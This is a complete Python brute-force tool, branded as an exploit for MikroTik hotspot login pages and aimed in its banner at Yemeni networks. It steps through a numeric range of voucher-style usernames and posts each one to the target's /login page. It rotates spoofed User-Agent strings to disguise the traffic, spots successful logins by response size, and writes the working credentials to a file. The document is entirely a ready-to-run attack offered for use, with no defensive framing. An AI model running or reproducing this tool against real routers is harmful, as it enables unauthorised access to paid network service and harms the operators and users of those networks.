#!/usr/bin/python3.6
# coding=utf-8
# *******************************************************************
# *** (EX-818-M) Exploit 818 Mikrotik ***
# * Version:
#   v1.0
# * Date:
#   19 - 08 - 2019 { Mon 19 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************

# Modules
import requests
import time
import os
import argparse
import sys

# colors

R = '\033[31m'      # Red
B = '\033[94m'      # Blue
Y = '\033[33m'      # Yellow
N = '\033[0m'       # None Color
W = '\033[7m'       # Wow Color
F = '\033[5m'       # Color Find


# write this def martaks
def write(M):
    for c in M + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2. / 100)


def req(url, port, maxNumber, minNumber, NL):
    _URL_ = url
    _PORT_ = port

    # Value Session for Dateless
    _session_ = requests.Session()

    # List of random User-Agents.
    agents = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) " +
        "Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0)" +
        " Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/56.0.2924.87 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; " +
        "Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS " +
        "X 10_12_2) AppleWebKit/602.3.12 (KHTML, " +
        "like Gecko) Version/10.0.2 Safari/602.3.12",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; " +
        "rv:51.0) Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 " +
        "like Mac OS X) AppleWebKit/602.4.6 (KHTML, " +
        "like Gecko) Version/10.0 Mobile/14D27" +
        " Safari/602.1",
        "Mozilla/5.0 (Linux; Android 6.0.1; " +
        "Nexus 6P Build/MTC19X) AppleWebKit/537.36 " +
        "(KHTML, like Gecko) Chrome/56.0.2924.87 " +
        "Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 " +
        "Build/KTU84P) AppleWebKit/537.36 (KHTML, " +
        "like Gecko) Chrome/56.0.2924.87" +
        "Mobile Safari/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1; " +
        "+http://www.google.com/bot.html)"
    ]

    # Url target and add http if not find in url !
    _URL_ = f"http://{_URL_}:{_PORT_}/login" if _URL_.startswith("http://") \
                                                is False else f"{_URL_}:{_PORT_}/login"

    # Use User-Agent on headers like proxy
    _session_.headers['User-Agent'] = agents[minNumber]

    # Send password data into Target site
    attack = _session_.post(url=_URL_, data={"username": f"{maxNumber}"})

    AllProcess = f"""
          {R}[{N}         {int(NL)}         {R}]{N}
[{B} * {N}] Date                : {attack.headers['Date']}
[{B} * {N}] Content Type        : {attack.headers['Content-Type']}
[{B} * {N}] User-Agent          : {_session_.headers['User-Agent'][0:50]}
[{B} * {N}] Date-Hack           : {attack.elapsed.total_seconds()} second
[{B} * {N}] Code-Site           : {attack.status_code} {{' Ok '}}"""

    _URL__O_ = f"http://{_URL_}:{_PORT_}/logout?erase-cookie=on" if _URL_.startswith("http://") \
                                                                    is False else f"{_URL_}:{_PORT_}/logout"

    if int(attack.headers['Content-Length']) < 4000:
        _session_.get(url=_URL__O_)
        _URL__O_ = f"http://{_URL_}:{_PORT_}/login" if _URL_.startswith(
            "http://") is False else f"{_URL_}:{_PORT_}/login"

    # return Number for size Page

    return [int(attack.headers['Content-Length']), str(AllProcess)]


def index_exploit(ip, port, number, file):
    global First, Next_save

    number = number.split(',')

    password_num = int()
    errors_num = int()
    minNumber = int()
    AllFor = int()
    Next_save = int() + 1

    for Password in range(int(number[0]), int(number[1])):

        smpleA = req(url=ip, port=port, maxNumber=Password, minNumber=minNumber, NL=int(AllFor+1))

        if AllFor == 0:
            # save any first size page number

            one_Save = smpleA[0]

            Next_save = one_Save

        AllFor += 1

        minNumber = int() if minNumber is 4 else minNumber + 1

        # if size page number is defiant an a first save password
        if smpleA[0] < 4000:
            password_num += 1

            save(True, file=file, ip=ip, port=port, Password=Password)

        if Next_save != smpleA[0] and smpleA[0] > 4000:
            errors_num += 1

            AllFor = 0

            save(False, file=file, ip=ip, port=port, Password=Password)

        First = f"""[{B} * {N}] Find Passwords      : "  {R}{password_num}{N}  "  
[{B} * {N}] Find Errors         : "  {R}{errors_num}{N}  "
[{Y + ' + ' + N if smpleA[0] < 4000 else R + ' - ' + N}] Password            : {Password}
[{Y + ' + ' + N if smpleA[0] < 4000 else R + ' - ' + N}] Active-Hack         : {Y + "Find" + N if smpleA[0] < 4000 
        else R + "No Find" + N}"""

        add(
            str(smpleA[1]),

            str(First),

            f'[{Y} ! {N}] {F}{R}Find Passwords {password_num} Please Open This file {file}{N}'
            if password_num != 0 else None,

            f'[{Y} ! {N}] {F}{R}Find Error Size {errors_num} Please Open This file Error{file}{N}'
            if errors_num != 0 else None,
        )

    input(f'{W}{R}---- Find Passwords {password_num} Please Open This file {file} ----{N}')


def save(act, file, ip, port, Password):
    if act is True:
        saveP = open(f'{file}', 'a')
        saveP.write(f'{"+" * 10} Mr.MHM {"+" * 10}\nDate = {time.ctime()}\n'
                    f'Url = http://{ip}:{port}/login\nPassword = {Password}\n\n')
        saveP.close()
    else:
        saveE = open(f'Error{file}', 'a')
        saveE.write(f'{"+" * 10} Mr.MHM {"+" * 10}\nDate = {time.ctime()}\n'
                    f'Url = http://{ip}:{port}/login\nPassword = {Password}\n\n')
        saveE.close()


def add(T1, T2, passwords, errors):
    L = int()
    while L < 1:
        os.system('clear')
        if passwords is not None:print(f'{passwords}\n')
        if errors is not None:print(errors)
        L += 1
        print(f'{T1}\n{T2}')
        print(f'\n\n\n\n--- Enter Ctrl+C for (exit) ---')


def main():
    write(f"""
{Y}++++++++++++++++++++++++++++++++++++++++++++++++++++++{N}
             {B}-::: Exploit 818 Mikrotik :::-
                        (EX-818-M)
                       Version: 1.0
                FOR {R}YEMEN{N}{B} NETWORKS
           Author : Mr.MHM | Facebook.com/mhm.hack  {N}
{Y}++++++++++++++++++++++++++++++++++++++++++++++++++++++{N}\n""")
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', required=True
                        , help='<ip> IP Target ')
    parser.add_argument('-p', '--port', default="80"
                        , help='<port> PORT Target like 80 or 8080 etc... ')
    parser.add_argument('-n', '--numbers'
                        , default="11064000,11065000"
                        , help='<number> numbers like -n 11064000,11065000 ')
    parser.add_argument('-o', '--output', default="PasswordEx818M.txt"
                        , help='<file> Write to file instead of stdout')
    parser.add_subparsers(title='Example'
                          , metavar='python3.6 ex818m.py -i 10.0.0.1 -p 80 -n 11064000,11065000')
    args = parser.parse_args()
    ip = args.ip
    port = args.port
    numbers = args.numbers
    output = args.output

    index_exploit(ip=ip, port=port, number=numbers, file=output)


if __name__ == '__main__':
    main()

# END !
